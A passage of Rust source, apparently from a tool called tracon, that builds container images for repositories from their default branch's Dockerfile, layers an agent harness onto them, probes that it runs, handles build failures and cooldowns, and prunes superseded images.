//! The image a repository's checks and preparation run in, built by the node
//! from the repository's own Dockerfile.
//!
//! The recipe is read from the repository's default branch through Git's
//! object store, never from a working tree: a candidate that could edit the
//! Dockerfile its own checks run in could make any check pass. What a recipe
//! produced is this node's state (`repo_image`), because a locally built image
//! has a different digest on every node; `[[repo]]` carries only the recipe.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex as StdMutex};
use std::time::Duration;

use sha2::{Digest, Sha256};
use tokio::sync::Mutex as AsyncMutex;

use crate::boundary::{Backend, BuildFailure, BuiltImage, ImageBuild, ImageBuilder, Presence};
use crate::config::{Config, Repo};
use crate::runner::{Runner, RunnerCommand};
use crate::store::{RepoImageStart, Store};

/// The image checks and preparation run in.
pub const BASE: &str = "base";

/// An image built for `repo_setup_try` from a drafted entry's Dockerfile.
/// Never what a repository's checks or sessions run in: an entry with the
/// same recipe adopts it as its `BASE` instead of building it again.
pub const TRIAL: &str = "trial";

/// Bumped when `normalised` changes what it adds, so every repository's image
/// is rebuilt with the new layer.
const NORMALISER: &str = "1";

const RECIPE_LABEL: &str = "io.tracon.recipe";

/// Long enough for a cold build of a full dev environment, short enough that a
/// build waiting on a prompt it will never get does not hold a session's start
/// for ever.
const BUILD_TIMEOUT: Duration = Duration::from_secs(45 * 60);

/// What a repository's image is built from, at one commit of its default
/// branch.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Recipe {
    pub dockerfile: String,
    /// The context directory inside the repository; empty for its root.
    pub context: String,
    pub source_ref: String,
    pub source_commit: String,
    /// The context directory as a Git tree: what the build is given.
    pub context_tree: String,
    /// The Dockerfile, its context and the node's own layer, as one hash. A
    /// commit that touches none of them leaves it — and the image — as it was.
    pub hash: String,
}

/// What `ensure_base` found or made.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Ensured {
    /// The repository's entry names no Dockerfile: nothing here to build.
    Unconfigured,
    /// The image for the current recipe was already built.
    Current(String),
    Rebuilt(String),
    /// The current recipe could not be built; an earlier image still stands.
    Stale {
        using: String,
        error: String,
    },
    /// There is no image for this repository at all.
    Unavailable {
        reason: String,
    },
}

impl Ensured {
    pub fn image(&self) -> Option<&str> {
        match self {
            Ensured::Current(image) | Ensured::Rebuilt(image) => Some(image),
            Ensured::Stale { using, .. } => Some(using),
            Ensured::Unconfigured | Ensured::Unavailable { .. } => None,
        }
    }
}

/// One build at a time per repository: two sessions starting together wait
/// for one image rather than building it twice.
fn build_lock(repo: &Path) -> Arc<AsyncMutex<()>> {
    static LOCKS: std::sync::LazyLock<StdMutex<HashMap<PathBuf, Arc<AsyncMutex<()>>>>> =
        std::sync::LazyLock::new(|| StdMutex::new(HashMap::new()));
    LOCKS
        .lock()
        .unwrap()
        .entry(repo.to_path_buf())
        .or_default()
        .clone()
}

/// How long a builder that could not build is left alone for one recipe.
/// Every check run and preparation queued behind an outage would otherwise
/// each stage a tree and run the builder's check again, minutes of work to
/// learn the same thing.
const COOLDOWN: Duration = Duration::from_secs(120);

type Cooldowns = HashMap<(PathBuf, String), (std::time::Instant, String)>;

/// Builder outages still cooling down, by repository and recipe: until when,
/// and what the builder said.
fn cooldowns() -> &'static StdMutex<Cooldowns> {
    static COOLDOWNS: std::sync::LazyLock<StdMutex<Cooldowns>> =
        std::sync::LazyLock::new(Default::default);
    &COOLDOWNS
}

fn retry_note(error: &str, until: std::time::Instant) -> String {
    let left = until
        .saturating_duration_since(std::time::Instant::now())
        .as_secs()
        .max(1);
    format!("{error}; tried again in {left}s, or at once by `tracon repo build`")
}

/// What a builder outage left for this recipe, while it cools down.
fn cooling(repo: &Path, key: &str) -> Option<String> {
    let mut cooldowns = cooldowns().lock().unwrap();
    let at = (repo.to_path_buf(), key.to_string());
    match cooldowns.get(&at) {
        Some((until, error)) if *until > std::time::Instant::now() => {
            Some(retry_note(error, *until))
        }
        Some(_) => {
            cooldowns.remove(&at);
            None
        }
        None => None,
    }
}

/// Leave this recipe alone for a while after the builder could not build
/// it; the error, saying when it is tried again.
fn cool(repo: &Path, key: &str, error: &str) -> String {
    let until = std::time::Instant::now() + COOLDOWN;
    cooldowns().lock().unwrap().insert(
        (repo.to_path_buf(), key.to_string()),
        (until, error.to_string()),
    );
    retry_note(error, until)
}

/// What `tracon repo build` clears besides the repository's own recipe:
/// every session layer that failed, and every builder outage still cooling
/// for the repository, so its next session tries again at once.
fn forget_session_failures(store: &Store, repo: &Path) {
    let _ = store.forget_failed_session_layers(&repo.to_string_lossy());
    cooldowns()
        .lock()
        .unwrap()
        .retain(|(cooling, _), _| cooling != repo);
}

fn warm(repo: &Path, key: &str) {
    cooldowns()
        .lock()
        .unwrap()
        .remove(&(repo.to_path_buf(), key.to_string()));
}

/// The `[[repo]]` entry for `repo`, if it names a Dockerfile to build.
pub fn building_entry(cfg: &Config, repo: &Path) -> Option<Repo> {
    cfg.repos()
        .iter()
        .find(|entry| entry.matches(repo))
        .filter(|entry| entry.dockerfile.is_some())
        .cloned()
}

/// The recipe `entry` names, as the repository's default branch has it now.
pub async fn recipe(repo: &Path, entry: &Repo, run_as: &RunAs) -> Result<Recipe, String> {
    let dockerfile = entry
        .dockerfile
        .clone()
        .ok_or("the repository's entry names no dockerfile")?;
    let context = match entry.context.as_deref() {
        Some(".") => String::new(),
        Some(context) => context.to_string(),
        None => dockerfile
            .rsplit_once('/')
            .map(|(directory, _)| directory.to_string())
            .unwrap_or_default(),
    };
    let dir = repo.to_string_lossy();
    let (source_ref, source_commit) = default_commit(repo).await?;
    let found = |what: &str, path: &str| {
        format!(
            "{what} {path} is not in {source_ref} ({})",
            &source_commit[..source_commit.len().min(12)]
        )
    };
    let blob = crate::review::resolve(&dir, &format!("{source_commit}:{dockerfile}"))
        .await
        .map_err(|_| found("the Dockerfile", &dockerfile))?;
    // `<commit>:<path>` takes everything after the colon as the path, so the
    // root, which has no path, is asked for by peeling the commit instead.
    let tree = match context.is_empty() {
        true => format!("{source_commit}^{{tree}}"),
        false => format!("{source_commit}:{context}"),
    };
    let context_tree = crate::review::resolve(&dir, &tree)
        .await
        .map_err(|_| found("the build context", &context))?;
    let mut hash = Sha256::new();
    for part in [NORMALISER, &dockerfile, &blob, &context, &context_tree] {
        hash.update(part.as_bytes());
        hash.update([0]);
    }
    // Podman's recipe hashes what it always did, so the images it already
    // built keep their keys; any other profile adds itself.
    if let Some(profile) = run_as.key() {
        hash.update(profile.as_bytes());
        hash.update([0]);
    }
    Ok(Recipe {
        dockerfile,
        context,
        source_ref,
        source_commit,
        context_tree,
        hash: hex::encode(hash.finalize()),
    })
}

/// The commit the recipe is read at. A clone the node manages always has
/// `origin/HEAD`; an operator's own checkout made with `git init` may not, and
/// what it has committed is then the only default there is. Never the working
/// tree, in either case.
pub(crate) async fn default_commit(repo: &Path) -> Result<(String, String), String> {
    let dir = repo.to_string_lossy();
    if let Ok(commit) = crate::review::resolve(&dir, "refs/remotes/origin/HEAD^{commit}").await {
        let name = match crate::review::default_base(&dir).await {
            Ok(branch) => format!("origin/{branch}"),
            Err(_) => "origin/HEAD".into(),
        };
        return Ok((name, commit));
    }
    if repo.starts_with(crate::forge::managed_root(&Config::state_dir())) {
        return Err("the clone has no origin/HEAD to read the Dockerfile from".into());
    }
    crate::review::resolve(&dir, "HEAD^{commit}")
        .await
        .map(|commit| ("HEAD".to_string(), commit))
        .map_err(|_| {
            format!(
                "{} has no commit to read the Dockerfile from",
                repo.display()
            )
        })
}

/// `localhost/tracon-repo-<name>-<hash>`: readable in `podman images`, and
/// distinct for two repositories that share a directory name.
fn image_name(repo: &Path) -> String {
    let slug: String = repo
        .file_name()
        .map(|name| name.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default()
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '-' })
        .collect();
    let slug = slug.trim_matches('-');
    let hash = hex::encode(Sha256::digest(repo.as_os_str().as_encoded_bytes()));
    match slug.is_empty() {
        true => format!("localhost/tracon-repo-{}", &hash[..10]),
        false => format!("localhost/tracon-repo-{slug}-{}", &hash[..10]),
    }
}

/// Who a run in a repository's image is, which decides what the node's layer
/// over it does. Part of every key built from it, so an image made for one
/// runtime is never taken for the other's.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RunAs {
    /// Podman: root with every capability dropped, at home in `/root`.
    Root,
    /// A Kubernetes pod: this uid and group, never root (the pod says
    /// `runAsNonRoot`), with this home.
    Pod { uid: i64, home: String },
}

impl RunAs {
    /// The profile `[runtime] kind` runs repository images with.
    pub fn of(cfg: &Config) -> Self {
        match cfg.runtime.kind {
            crate::config::RuntimeKind::Podman => RunAs::Root,
            crate::config::RuntimeKind::Kubernetes => RunAs::Pod {
                uid: cfg.runtime.kubernetes.uid,
                home: cfg.runtime.kubernetes.harness_home.clone(),
            },
        }
    }

    /// What a key adds for this profile. Nothing for Podman, whose keys
    /// (and so the images already built under them) stay as they were.
    fn key(&self) -> Option<String> {
        match self {
            RunAs::Root => None,
            RunAs::Pod { uid, home } => Some(format!("pod:{uid}:{home}")),
        }
    }

    fn home(&self) -> &str {
        match self {
            RunAs::Root => "/root",
            RunAs::Pod { home, .. } => home,
        }
    }
}

/// The node's layer over a repository's own image, so every run in it meets
/// the same thing whatever the Dockerfile ended on.
///
/// A dev environment usually ends as an unprivileged user in that user's
/// home. Under Podman runs are root with every capability dropped, in
/// `/work`, which root owns: without `USER 0:0` nothing could write the
/// workspace. An `ENTRYPOINT` (a devcontainer's process supervisor) would
/// swallow the command a run names. And a login shell on some bases resets
/// `PATH` for root, losing what the Dockerfile's `ENV PATH` added; the
/// profile line puts it back.
///
/// A pod is never root: it runs as the configured uid, which owns `/work`,
/// `/cache` and the harness's home here, and the image says so with its last
/// `USER`. The uid is given a name where the image has none for it, because
/// Git, SSH and some package managers refuse to run as a uid with no passwd
/// entry. What the repository installed has to be readable and executable
/// by that uid, which nothing here can arrange after the fact (see
/// ARCHITECTURE, "the recipe is configuration").
fn normalised(source: &str, run_as: &RunAs) -> String {
    match run_as {
        RunAs::Root => format!(
            "FROM {source}\n\
             USER 0:0\n\
             ENV HOME=/root\n\
             RUN mkdir -p /work /cache && if [ -d /etc/profile.d ]; then \
             printf 'export PATH=\"%s\"\\n' \"$PATH\" > /etc/profile.d/zz-tracon-path.sh; fi\n\
             WORKDIR /work\n\
             ENTRYPOINT []\n"
        ),
        RunAs::Pod { uid, home } => format!(
            "FROM {source}\n\
             USER 0:0\n\
             RUN mkdir -p /work /cache {home} && chown {uid}:{uid} /work /cache \
             && chown -R {uid}:{uid} {home} \
             && if ! grep -q '^[^:]*:[^:]*:{uid}:' /etc/passwd 2>/dev/null; then \
             echo 'harness:x:{uid}:{uid}::{home}:/bin/sh' >> /etc/passwd; fi \
             && if ! grep -q '^[^:]*:[^:]*:{uid}:' /etc/group 2>/dev/null; then \
             echo 'harness:x:{uid}:' >> /etc/group; fi \
             && if [ -d /etc/profile.d ]; then \
             printf 'export PATH=\"%s\"\\n' \"$PATH\" > /etc/profile.d/zz-tracon-path.sh; fi\n\
             ENV HOME={home}\n\
             WORKDIR /work\n\
             USER {uid}:{uid}\n\
             ENTRYPOINT []\n"
        ),
    }
}

/// How a harness goes onto a repository's image: what is copied out of the
/// harness's own image, the environment that image sets, and the command that
/// proves the result runs. Only a harness that is one binary is carried this
/// way. OpenCode's image is an entrypoint and a toolchain profile the launch
/// manifest records, and it stays in it.
struct HarnessLayer {
    lines: String,
    probe: String,
}

fn harness_layer(harness_id: &str, run_as: &RunAs) -> Option<HarnessLayer> {
    match harness_id {
        crate::adapter::claude::ClaudeAdapter::ID => {
            // By path, as the session launches it: a `claude` the
            // repository's image put earlier on `PATH` proves nothing.
            let binary = crate::adapter::claude::ClaudeAdapter::BINARY;
            let probe = format!("{binary} --version && git --version");
            Some(HarnessLayer {
                lines: format!(
                    "COPY --from=harness {binary} {binary}\n\
                     ENV CLAUDE_CONFIG_DIR={}/.claude DISABLE_AUTOUPDATER=1 DISABLE_TELEMETRY=1\n",
                    run_as.home()
                ),
                probe: match run_as {
                    RunAs::Root => probe,
                    RunAs::Pod { .. } => format!("{probe} && {} --version", POD_INIT),
                },
            })
        }
        _ => None,
    }
}

/// Where a pod's session image keeps its init. Copied from the harness
/// image's statically linked `tini`, so it runs on any base, and kept out of
/// the paths a repository's own image installs to.
const POD_INIT: &str = crate::runner::kube::SESSION_INIT;

/// Bumped when the session layer itself changes.
const SESSION_LAYER: &str = "1";

/// The harness over a repository's image. The node's own layer is applied
/// again because the image may be one the operator pinned by hand, which
/// never had it. A pod also gets an init: a pod's first process is PID 1,
/// which no signal it does not handle reaches and which has to reap what
/// the harness's tools leave behind, and Podman's `--init` has no pod
/// equivalent.
fn layered(base: &str, harness_image: &str, layer: &HarnessLayer, run_as: &RunAs) -> String {
    let init = match run_as {
        RunAs::Root => String::new(),
        RunAs::Pod { .. } => format!("COPY --from=harness /usr/bin/tini-static {POD_INIT}\n"),
    };
    format!(
        "FROM {harness_image} AS harness\n{}{}{init}",
        normalised(base, run_as),
        layer.lines
    )
}

/// The image one session's harness runs in.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SessionImage {
    /// `None` is the harness's own image.
    pub image: Option<String>,
    /// The repository image under it: what its checks run in.
    pub toolchain_image: Option<String>,
    /// Why a session whose repository has an image is not running in it.
    pub note: Option<String>,
}

impl SessionImage {
    pub fn source(&self) -> &'static str {
        match self.image {
            Some(_) => "repository image",
            None => "harness image",
        }
    }

    fn aside(note: impl Into<String>) -> Self {
        Self {
            note: Some(note.into()),
            ..Default::default()
        }
    }
}

/// The image a session on `repo` runs in: the repository's, with the harness
/// layered on, where its entry names one.
///
/// A repository with no image yet builds one here, and `building` is called
/// first because that takes minutes. One whose Dockerfile has since moved
/// starts on the image it has and is rebuilt behind the session, so a
/// Dockerfile change costs the next session nothing and this one no wait.
/// Anything that stops the session having its repository's image leaves it in
/// the harness's own, with the reason: a session that cannot build is still
/// the one that can fix what broke.
pub async fn session_image(
    backend: &Arc<dyn Backend>,
    cfg: &Arc<Config>,
    store: &Arc<Store>,
    repo: &Path,
    (harness_id, harness_version): (&str, &str),
    building: &(dyn Fn() + Send + Sync),
) -> SessionImage {
    let repos = cfg.repos();
    let Some(entry) = repos
        .iter()
        .find(|entry| entry.matches(repo))
        .filter(|entry| entry.image.is_some() || entry.dockerfile.is_some())
    else {
        return SessionImage::default();
    };
    let run_as = RunAs::of(cfg);
    let Some(layer) = harness_layer(harness_id, &run_as) else {
        return SessionImage::aside(format!(
            "the {harness_id} harness runs in its own image; it is not layered onto a repository's"
        ));
    };
    let Some(builder) = backend.image_builder() else {
        return SessionImage::aside(format!(
            "the {} runtime cannot build images",
            backend.kind()
        ));
    };
    if !backend.runs_sessions_in_repository_images() {
        return SessionImage::aside(format!(
            "the {} runtime runs a session in its harness's own image",
            backend.kind()
        ));
    }
    let base = match &entry.image {
        Some(image) => image.clone(),
        None => {
            let repo_path = repo.to_string_lossy();
            // A registry that cannot be asked keeps what is standing.
            let standing = match store.ready_repo_image(&repo_path, BASE).ok().flatten() {
                Some(row) if builder.presence(&row.image).await != Presence::Absent => Some(row),
                _ => None,
            };
            match standing {
                Some(row) => {
                    let moved = recipe(repo, entry, &run_as)
                        .await
                        .is_ok_and(|recipe| recipe.hash != row.recipe_hash);
                    if moved {
                        let (backend, cfg, store) = (backend.clone(), cfg.clone(), store.clone());
                        let repo = repo.to_path_buf();
                        tokio::spawn(async move {
                            ensure_base(backend.as_ref(), &cfg, &store, &repo, false).await;
                        });
                    }
                    row.image
                }
                None => {
                    building();
                    match ensure_base(backend.as_ref(), cfg, store, repo, false).await {
                        Ensured::Unavailable { reason } => return SessionImage::aside(reason),
                        ensured => match ensured.image() {
                            Some(image) => image.to_string(),
                            None => return SessionImage::default(),
                        },
                    }
                }
            }
        }
    };
    let runner = backend.runner_for(harness_id, Vec::new());
    let harness = SessionHarness {
        id: harness_id,
        version: harness_version,
        image: backend.harness_image(cfg, harness_id),
        layer,
        run_as,
    };
    ensure_session_with(builder, runner.as_ref(), store, repo, &base, &harness).await
}

struct SessionHarness<'a> {
    id: &'a str,
    version: &'a str,
    image: String,
    layer: HarnessLayer,
    run_as: RunAs,
}

async fn ensure_session_with(
    builder: &dyn ImageBuilder,
    runner: &dyn Runner,
    store: &Store,
    repo: &Path,
    base: &str,
    harness: &SessionHarness<'_>,
) -> SessionImage {
    let unlayered = |note: String| SessionImage {
        toolchain_image: Some(base.to_string()),
        note: Some(note),
        image: None,
    };
    let lock = build_lock(repo);
    let _building = lock.lock().await;
    // Keyed on what the harness's tag names now: a harness upgrade rebuilds
    // this layer and leaves the repository's image, and its evidence, alone.
    let Some(harness_image) = builder.identity(&harness.image).await else {
        // A builder that cannot reach its registry cannot find anything, and
        // says why; a harness image a pod pulls is the release's, which no
        // `tracon setup` makes.
        if let Some(why) = builder.unavailable().await {
            return unlayered(why);
        }
        return unlayered(match harness.run_as {
            RunAs::Root => format!(
                "the harness image {} is missing; `tracon setup` builds it",
                harness.image
            ),
            RunAs::Pod { .. } => format!(
                "the harness image {} could not be found in its registry",
                harness.image
            ),
        });
    };
    let mut hash = Sha256::new();
    for part in [SESSION_LAYER, base, &harness_image, &harness.layer.lines] {
        hash.update(part.as_bytes());
        hash.update([0]);
    }
    if let Some(profile) = harness.run_as.key() {
        hash.update(profile.as_bytes());
        hash.update([0]);
    }
    let key = hex::encode(hash.finalize());
    let kind = format!("session:{}", harness.id);
    let repo_path = repo.to_string_lossy();
    let ready = store.ready_repo_image(&repo_path, &kind).ok().flatten();
    if let Some(row) = ready.as_ref().filter(|row| row.recipe_hash == key) {
        if builder.presence(&row.image).await != Presence::Absent {
            return SessionImage {
                image: Some(row.image.clone()),
                toolchain_image: Some(base.to_string()),
                note: None,
            };
        }
    }
    let latest = store.latest_repo_image(&repo_path, &kind).ok().flatten();
    if let Some(failed) = latest.filter(|row| row.status == "failed" && row.recipe_hash == key) {
        return unlayered(failed.error);
    }
    if let Some(why) = cooling(repo, &key) {
        return unlayered(why);
    }
    if let Some(why) = builder.unavailable().await {
        return unlayered(cool(repo, &key, &why));
    }
    let started = RepoImageStart {
        repo_path: &repo_path,
        kind: &kind,
        recipe_hash: &key,
        source_ref: "",
        source_commit: "",
        parent_image: base,
    };
    let id = match store.start_repo_image(&started) {
        Ok(id) => id,
        Err(error) => return unlayered(error.to_string()),
    };
    let built = build_session(builder, runner, repo, base, &harness_image, &key, harness).await;
    match built {
        Ok(built) => {
            let _ = store.finish_repo_image(&id, Ok(&built.image), &built.log_tail, &[]);
            warm(repo, &key);
            supersede(builder, store, repo, &kind).await;
            SessionImage {
                image: Some(built.image),
                toolchain_image: Some(base.to_string()),
                note: None,
            }
        }
        Err(failure) => {
            tracing::warn!(repo = %repo.display(), error = %failure.error, "session image build failed");
            settle_failure(store, &id, &failure);
            match failure.transient {
                true => unlayered(cool(repo, &key, &failure.error)),
                false => unlayered(failure.error),
            }
        }
    }
}

/// Build the layer and prove the harness runs in it before anything is told
/// to launch there: a base image with a different libc, or without Git, is
/// found here and not as a session that dies at start.
async fn build_session(
    builder: &dyn ImageBuilder,
    runner: &dyn Runner,
    repo: &Path,
    base: &str,
    harness_image: &str,
    key: &str,
    harness: &SessionHarness<'_>,
) -> Result<BuiltImage, BuildFailure> {
    let staged = |error: String| BuildFailure {
        error,
        log_tail: String::new(),
        ..Default::default()
    };
    let stage = stage_dir(builder).map_err(|e| staged(e.to_string()))?;
    let containerfile = stage.path().join("Session.Containerfile");
    std::fs::write(
        &containerfile,
        layered(base, harness_image, &harness.layer, &harness.run_as),
    )
    .map_err(|e| staged(e.to_string()))?;
    let empty = stage.path().join("empty");
    std::fs::create_dir_all(&empty).map_err(|e| staged(e.to_string()))?;
    let built = builder
        .build(ImageBuild {
            tag: &format!("{}-{}:{}", image_name(repo), harness.id, &key[..12]),
            containerfile: &containerfile,
            context: &empty,
            labels: &[(RECIPE_LABEL.to_string(), key.to_string())],
            timeout: BUILD_TIMEOUT,
        })
        .await?;
    let probe = runner
        .run_capture(RunnerCommand {
            argv: ["sh", "-c", &harness.layer.probe]
                .map(String::from)
                .to_vec(),
            image: Some(built.image.clone()),
            name: format!("tracon-probe-{}", uuid::Uuid::now_v7().simple()),
            ..Default::default()
        })
        .await;
    let said = match &probe {
        Ok(out) => String::from_utf8_lossy(&[out.stdout.clone(), out.stderr.clone()].concat())
            .trim()
            .to_string(),
        Err(error) => error.to_string(),
    };
    // A probe the runtime could not run says nothing about the image.
    let unrun = probe.is_err();
    if probe.is_ok_and(|out| out.status.success()) && said.contains(harness.version) {
        return Ok(built);
    }
    builder.remove(&built.image).await;
    Err(BuildFailure {
        error: match unrun {
            true => format!("the harness probe could not run: {said}"),
            false => format!(
                "{} {} does not run in the repository's image",
                harness.id, harness.version
            ),
        },
        log_tail: said,
        transient: unrun,
    })
}

/// Make sure the image for `repo`'s current recipe exists, building it if it
/// does not. `force` rebuilds even an image that is current, and retries a
/// recipe that already failed.
///
/// A recipe that fails is not retried on its own: every session start and
/// every check would otherwise repeat a build that takes minutes to fail the
/// same way. The last image that built keeps the repository usable meanwhile.
pub async fn ensure_base(
    backend: &dyn Backend,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    force: bool,
) -> Ensured {
    if force {
        forget_session_failures(store, repo);
    }
    let Some(entry) = building_entry(cfg, repo) else {
        return Ensured::Unconfigured;
    };
    // An entry that keeps lending credentials to a preparation a peer's
    // recipe changed builds nothing, forced or not, until the operator
    // starts that build: a build is followed by the one warm-up the
    // credentials are lent to. What last built keeps the repository usable.
    if let Some(hold) = crate::mesh::recipe::held(store, &entry) {
        let reason = crate::mesh::recipe::held_reason(&hold);
        tracing::info!(repo = %repo.display(), "repository image held: {reason}");
        return match store
            .ready_repo_image(&repo.to_string_lossy(), BASE)
            .ok()
            .flatten()
        {
            Some(row) => Ensured::Stale {
                using: row.image,
                error: reason,
            },
            None => Ensured::Unavailable { reason },
        };
    }
    let Some(builder) = backend.image_builder() else {
        return Ensured::Unavailable {
            reason: format!("the {} runtime cannot build images", backend.kind()),
        };
    };
    let runner = backend.runner(Vec::new());
    let commands = crate::environment::environment_for(cfg, store, Some(repo));
    let commands: Vec<String> = commands
        .checks
        .into_iter()
        .chain(commands.prepare)
        .collect();
    let ensured = ensure_with(
        builder,
        runner.as_ref(),
        cfg,
        store,
        repo,
        &entry,
        &commands,
        force,
    )
    .await;
    if matches!(ensured, Ensured::Rebuilt(_)) {
        warm_base_cache(backend, cfg, store, repo).await;
    }
    ensured
}

/// Fill the repository's base dependency cache by preparing its default
/// branch in the image just built. This is the only thing that ever writes
/// that cache: what is in it came from source the operator already merged,
/// through the entry's own `prepare` and `egress`, so every candidate and
/// every session can start from a copy of it without inheriting anything
/// another candidate installed. A warm-up that fails leaves a cache that is
/// merely colder.
///
/// It is also the one preparation lent the entry's `prepare_credentials`: it
/// runs source the operator merged, not a candidate's, and what it fetches
/// from a private registry is what the others then install from the cache
/// without the credential. A credential the broker will not lend stops the
/// warm-up before anything runs, rather than letting the registry refuse it.
async fn warm_base_cache(backend: &dyn Backend, cfg: &Config, store: &Store, repo: &Path) {
    let environment = crate::environment::environment_for(cfg, store, Some(repo));
    if environment.prepare.is_empty() {
        return;
    }
    let Some(entry) = building_entry(cfg, repo) else {
        return;
    };
    // `ensure_base` builds nothing for a held entry, so it never gets here;
    // this is the one place credentials are lent, so it checks again.
    if crate::mesh::recipe::held(store, &entry).is_some() {
        tracing::warn!(repo = %repo.display(), "base cache not warmed: the entry is held");
        return;
    }
    let lent = entry.prepare_credentials;
    let warmed = async {
        let secrets = crate::environment::PrepareSecrets::new(
            crate::broker::preparation_env_for(repo, &lent)
                .map_err(|error| format!("prepare_credentials: {error}"))?,
        );
        let (_, commit) = default_commit(repo).await?;
        let tree = crate::review::snapshot_candidate(
            &repo.to_string_lossy(),
            &commit,
            cfg.supervision.max_snapshot_bytes,
        )
        .await
        .map_err(|error| error.to_string())?;
        let id = uuid::Uuid::now_v7().simple().to_string();
        let work = format!("tracon-warm-{id}");
        backend
            .import_writable(&work, &tree.root)
            .await
            .map_err(|error| error.to_string())?;
        let runner = backend.runner(Vec::new());
        let prepared = crate::review::checks::run_preparation_with(
            backend,
            runner.as_ref(),
            &environment,
            (&work, &environment.cache_volume),
            &format!("tracon-w-{}", &id[..12]),
            tokio::time::Instant::now() + Duration::from_secs(environment.timeout_secs),
            &crate::review::checks::RunToCompletion,
            "the base cache stays as it was",
            &secrets,
        )
        .await;
        let _ = backend.remove_volume(&work).await;
        prepared.map_err(|stopped| stopped.to_string())
    };
    match warmed.await {
        Ok(()) => tracing::info!(repo = %repo.display(), "base dependency cache warmed"),
        Err(error) => {
            tracing::warn!(repo = %repo.display(), %error, "base dependency cache not warmed")
        }
    }
}

/// The environment a run in `repo` gets, with its image built first if the
/// entry names a Dockerfile. A build that fails leaves whatever
/// `environment_for` still resolves: the last image that built, or the
/// harness image with that said.
pub async fn environment(
    backend: &dyn Backend,
    cfg: &Config,
    store: &Store,
    repo: Option<&Path>,
) -> crate::environment::RepoEnvironment {
    if let Some(repo) = repo {
        ensure_base(backend, cfg, store, repo, false).await;
    }
    crate::environment::environment_for(cfg, store, repo)
}

#[allow(clippy::too_many_arguments)]
async fn ensure_with(
    builder: &dyn ImageBuilder,
    runner: &dyn Runner,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    entry: &Repo,
    commands: &[String],
    force: bool,
) -> Ensured {
    let lock = build_lock(repo);
    let _building = lock.lock().await;
    let repo_path = repo.to_string_lossy();
    let ready = match store.ready_repo_image(&repo_path, BASE) {
        Ok(ready) => ready,
        Err(error) => {
            return Ensured::Unavailable {
                reason: error.to_string(),
            }
        }
    };
    // An image the runtime pruned is not one a run can use. One a registry
    // could not be asked about is used as it stands.
    let presence = match &ready {
        Some(row) => builder.presence(&row.image).await,
        None => Presence::Absent,
    };
    let standing = ready.filter(|_| presence != Presence::Absent);
    let fallback = |error: String| match &standing {
        Some(row) => Ensured::Stale {
            using: row.image.clone(),
            error,
        },
        None => Ensured::Unavailable { reason: error },
    };
    let recipe = match recipe(repo, entry, &RunAs::of(cfg)).await {
        Ok(recipe) => recipe,
        Err(error) => return fallback(error),
    };
    // A trial the operator allowed may already have built this recipe.
    let mut tried = None;
    if !force {
        if let Some(row) = standing
            .as_ref()
            .filter(|row| row.recipe_hash == recipe.hash)
        {
            return Ensured::Current(row.image.clone());
        }
        if presence == Presence::Unknown {
            return fallback(
                "the image builder could not say whether the repository's image is still there; \
                 it is used as it stands and not rebuilt until it can"
                    .into(),
            );
        }
        tried = built_for_trial(builder, store, repo, &recipe.hash).await;
        let latest = store.latest_repo_image(&repo_path, BASE).ok().flatten();
        if let Some(failed) = latest.filter(|row| {
            tried.is_none() && row.status == "failed" && row.recipe_hash == recipe.hash
        }) {
            return fallback(format!("{}; `tracon repo build` tries again", failed.error));
        }
    }
    // A builder that cannot build says so before a tree is staged or a build
    // is recorded against the recipe.
    // One that could not a moment ago is left alone for a while, unless
    // the operator asks.
    if tried.is_none() {
        if !force {
            if let Some(why) = cooling(repo, &recipe.hash) {
                return fallback(why);
            }
        }
        if let Some(why) = builder.unavailable().await {
            return fallback(cool(repo, &recipe.hash, &why));
        }
    }
    let started = RepoImageStart {
        repo_path: &repo_path,
        kind: BASE,
        recipe_hash: &recipe.hash,
        source_ref: &recipe.source_ref,
        source_commit: &recipe.source_commit,
        parent_image: "",
    };
    let id = match store.start_repo_image(&started) {
        Ok(id) => id,
        Err(error) => return fallback(error.to_string()),
    };
    let built = match tried {
        Some(tried) => Ok(tried),
        None => {
            tracing::info!(repo = %repo.display(), recipe = %recipe.hash, "building repository image");
            build(builder, cfg, store, repo, &recipe).await
        }
    };
    match built {
        Ok(built) => {
            let warnings = missing_tools(runner, &built.image.image, commands).await;
            let _ = store.finish_repo_image(
                &id,
                Ok(&built.image.image),
                &built.image.log_tail,
                &warnings,
            );
            let _ = store.set_repo_image_parent(&id, &built.source);
            warm(repo, &recipe.hash);
            supersede(builder, store, repo, BASE).await;
            Ensured::Rebuilt(built.image.image)
        }
        Err(failure) => {
            tracing::warn!(repo = %repo.display(), error = %failure.error, "repository image build failed");
            settle_failure(store, &id, &failure);
            match failure.transient {
                true => fallback(cool(repo, &recipe.hash, &failure.error)),
                false => fallback(failure.error),
            }
        }
    }
}

/// Record a build that failed. One the builder failed (`transient`) is
/// dropped instead of recorded: it says nothing about the recipe, and a
/// recorded failure would stand against the recipe until the operator asked
/// again.
fn settle_failure(store: &Store, id: &str, failure: &BuildFailure) {
    let _ = match failure.transient {
        true => store.abandon_repo_image(id),
        false => store.finish_repo_image(id, Err(&failure.error), &failure.log_tail, &[]),
    };
}

/// Remove what a finished build of `kind` superseded: the build before it,
/// or, for a builder that keeps a previous generation (a registry a pod may
/// still be about to pull from), the build before that. Nothing a kept build
/// of any kind still names is removed, as its image or as the image it
/// stands on, and nothing this node did not build: a session layer's base is
/// removed with it only when it is a repository image of this node's, never
/// an image an entry pinned.
async fn supersede(builder: &dyn ImageBuilder, store: &Store, repo: &Path, kind: &str) {
    let depth = match builder.retains_previous() {
        true => 2,
        false => 1,
    };
    let Ok(rows) = store.ready_repo_images(&repo.to_string_lossy()) else {
        return;
    };
    let mut seen: HashMap<&str, usize> = HashMap::new();
    let mut kept: std::collections::HashSet<&str> = Default::default();
    let mut kept_recipes: std::collections::HashSet<&str> = Default::default();
    let mut victim = None;
    for row in &rows {
        let count = seen.entry(row.kind.as_str()).or_default();
        if *count < depth {
            kept.insert(row.image.as_str());
            kept.insert(row.parent_image.as_str());
            if row.kind == BASE || row.kind == TRIAL {
                kept_recipes.insert(row.recipe_hash.as_str());
            }
